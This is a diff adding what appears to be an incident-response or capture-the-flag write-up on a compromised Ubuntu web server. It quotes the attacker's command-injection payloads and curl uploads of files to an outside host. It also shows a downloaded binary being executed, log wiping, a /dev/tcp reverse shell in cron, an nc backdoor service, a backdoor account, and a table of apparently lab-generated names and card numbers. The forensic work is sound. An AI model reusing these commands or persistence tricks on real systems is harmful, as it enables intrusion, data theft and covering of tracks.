@@ -1,0 +1,179 @@
+before gaining access to the server the hacker enumerated the server using the "Command Injection" vulnerability the hacker first knew that if ssh is available or not
+then they ran the following {
+1. tz=%22%20which%20ssh%20%23 --> which ssh
+2. tz=%22%3B%20mkdir%20%2Fhome%2Fdev%2F%2Essh%20%26%26%20chmod%20700%20%2Fhome%2Fdev%2F%2Essh%20%23 --> "; mkdir /home/dev/.ssh && chmod 700 /home/dev/.ssh #
+3. tz=%22%3B%20echo%20%22ssh%2Ded25519%20AAAAC3NzaC1lZDI1NTE5AAAAICA2iX8BUH3ySq42MSFp%2FHdNbiEFl5Eagg%2FQIyBg5NdP%22%20%3E%3E%20%2Fhome%2Fdev%2F%2Essh%2Fauthorized%5Fkeys%20%23 --> "; echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICA2iX8BUH3ySq42MSFp/HdNbiEFl5Eagg/QIyBg5NdP" >> /home/dev/.ssh/authorized_keys
+}
+
+the hacker ran this command "curl --upload-file config.py http://5.230.66.147/me7d6bd4beh4ura8/upload" 
+which indicated that the config.py file was compromised
+path of this file is:  /home/dev/apiservice/src/config.py
+##potential cause can be because of the credentials in that file
+{
+    # TODO: Implement some authentication
+    # API_USER = "dev"
+    # API_PASS = "d3v-p455w0rd"
+
+}
+
+##when chnaging to the root user and cd into the /root dir and ran the ls -al cmd we found a file named .dump.json  
+
+### ls-al output
+drwx------  5 root root 4096 Aug  5 09:43 .
+drwxr-xr-x 19 root root 4096 Jul 28  2023 ..
+-rw-------  1 root root  801 Aug  5 10:12 .bash_history
+-rw-r--r--  1 root root 3390 Jul 30  2023 .bashrc
+-rw-r--r--  1 root root  221 Jul 30  2023 .dump.json
+-rw-------  1 root root   20 Aug  5 09:43 .lesshst
+drwxr-xr-x  3 root root 4096 Jul 29  2023 .local
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-r--r--  1 root root 6150 Jul 30  2023 .review.csv
+drwx------  3 root root 4096 Jul 28  2023 snap
+drwx------  2 root root 4096 Jul 28  2023 .ssh
+
+### cat .dump.json output
+
+
+{
+  "C0": "ODguMTU2LjEzMi42Nw==",
+  "C1": "cHJvZC13ZWItMDAzOjoyMDIzLTA3LTMwIDE2OjAzOjI2Ojo1LjE1LjAtNzgtZ2VuZXJpYzo6VWJ1bnR1IDIyLjA0LjIgTFRTOjpzc2gtMjI=",
+  "C2": "MTkyLjE2OC4wLjIxOjIyOjoxOTIuMTY4LjAuMjE6ODA6OjE5Mi4xNjguMC4yMjoyMg=="
+}
+the contents seems to be a base64 encoded when decoded it becomes 
+#decoded json 
+{
+"C0" : "88.156.132.67",
+"C1" : "prod-web-003::2023-07-30 16:03:26::5.15.0-78-generic::Ubuntu 22.04.2 LTS::ssh-22"
+"C2" : "192.168.0.21:22::192.168.0.21:80::192.168.0.22:22"
+}
+
+#checking the .review.csv file 
+cmd == head .review.csv
+
+name,email,savedcard
+-,-,pwned{v3ry-secur3-cardh0ld3r-data-environm3nt}
+Nolan Stanton,nolanstanton@outlook.com,5352 8841 6967 2533
+Adrienne Clark,adrienneclark1121@outlook.com,5456 8428 8247 1455
+Amaya Richmond,amayarichmond@apiwizards.com,5338 6565 4623 7944
+Camille Gilbert,camillegilbert@gmail.com,5318 8381 6714 8386
+Melvin Richards,melvinrichards6579@apiwizards.com,5145 8258 4368 8553
+Aquila Chavez,aquilachavez22@apiwizards.com,5462 9878 9566 4232
+Alexandra Holman,alexandraholman@gmail.com,5359 1249 7733 9980
+Cleo Harrell,cleoharrell1957@outlook.com,5288 6661 3421 3264
+
+#when runing the histroy command as the root user we get the following
+   1  cd /tmp/
+    2  wget https://transfer.sh/2tttL9HJLG/rooter2 --> {service is transfer.sh} downloading the malicoius file from the hacker's server
+    3  file rooter2 --> the actual malicous file 
+    4  chmod +x rooter2 && ./rooter2 --> giving the executable permission to the file and executing the file
+    5  cd /root/
+    6  ls -la
+    7  cat .ssh/authorized_keys 
+    8  ll .ssh/
+    9  curl --upload-file .dump.json http://5.230.66.147/me7d6bd4beh4ura8/upload --> the hacker is stealing the .dump.json file
+   10  nc -zv 192.168.0.22 22
+   11  nc -zv 192.168.0.22 1024-10000 2>&1 | grep -v failed
+   12  curl -v 192.168.0.22:8080
+   13  wget 192.168.0.22:8080/cde-backup.csv 
+   14  >/var/log/wtmp
+   15  >/var/log/btmp
+   16  lastlog --clear --user root
+   17  lastlog --clear --user dev
+   18  mv cde-backup.csv .review.csv 
+   19  systemctl status nginx
+   20  systemctl status apiservice
+   21  curl localhost
+   22  systemctl status apiservice
+   23  exit
+   24  ls
+   25  clear
+   26  cd apiservice/
+   27  ls
+   28  cat main.py 
+   29  ls src/
+   30  cat src/config.py 
+   31  cat src/api.py 
+   32  clear
+   33  systemctl status nginx
+   34  cat /var/log/nginx/access.log
+   35  cat /var/log/nginx/access.log.1 
+   36  clear
+   37  pwd
+   38  ls
+   39  id
+   40  exit
+   41  ls
+   42  clear
+   43  cd /root
+   44  ls
+   45  clear
+   46  ls -al 
+   47  cat .dump.json 
+   48  clear
+   49  cat .review.csv 
+   50  head .review.csv 
+   51  which python
+   52  python3
+   53  pyton -m http.server
+   54  python3 -m http.server
+   55  clear
+   56  ls -al
+   57  cat .profile 
+   58  cat .bash_history 
+   59  cat .bashrc 
+   60  clear
+   61  history
+
+
+
+
+#bashrc contents which are not supposed to be here
+shopt -s histappend
+PROMPT_COMMAND="history -a;$PROMPT_COMMAND"
+iptables -I OUTPUT 1 -p tcp -d 5.230.66.147 -j ACCEPT
+iptables -I INPUT 1 -p tcp -s 5.230.66.147 -j ACCEPT
+iptables -I INPUT 2 -p tcp -s 0.0.0.0/0 --dport 3578 -j DROP
+curl -m 5 http://5.230.66.147/me7d6bd4beh4ura8/fix
+
+
+##checking /etc/crontab
+when checking the crontab file we see one suspicous line at the last which is 
+20 4 * * * root eval $SYSTEMUPDATE -- >we have a service as the root user
+###echo $SYSTEMUPDATE gives us
+/bin/bash -c '/bin/bash -i >& /dev/tcp/5.230.66.147/1337 0>&1' --> This command establishes a reverse shell. The compromised machine initiates a connection to the attacker's machine (at 5.230.66.147 on port 1337), allowing the attacker to execute commands on the compromised machine remotely.
+### checking the env variable
+SYSTEMUPDATE=/bin/bash -c '/bin/bash -i >& /dev/tcp/5.230.66.147/1337 0>&1'
+
+#checking the system services and found socket.service as unusual when looking further into it we saw this 
+cat /etc/systemd/system/socket.service 
+[Unit]
+Description=Linux Socket Service
+Wants=network-online.target
+After=network-online.target
+
+[Service]
+Type=simple
+User=root
+Group=root
+WorkingDirectory=/
+ExecStart=/bin/bash -c \
+'mkfifo /tmp/s; cat /tmp/s | /bin/bash 2>&1 \
+| nc -l $((1786*2+6)) >/tmp/s; rm /tmp/s' --> this machines listens on port 3578  for maybe commands from the cnc server
+
+Restart=always
+RestartSec=10
+
+[Install]
+WantedBy=multi-user.target
+
+
+###the attacker created a new backdoor account for themself named
+support:x:1001:1001:,,,:/home/support:/bin/bash
+#it belongs to the group sudo
+
+###What is the strange word on one of the backdoored SSH keys?
+root@prod-web-003:~# cat /root/.ssh/authorized_keys 
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPllf3AGMrW5GhvcX7eq2vbCIxElU3Ef/HRm5ZwLVbKj {ntsvc}
+
+### 
+
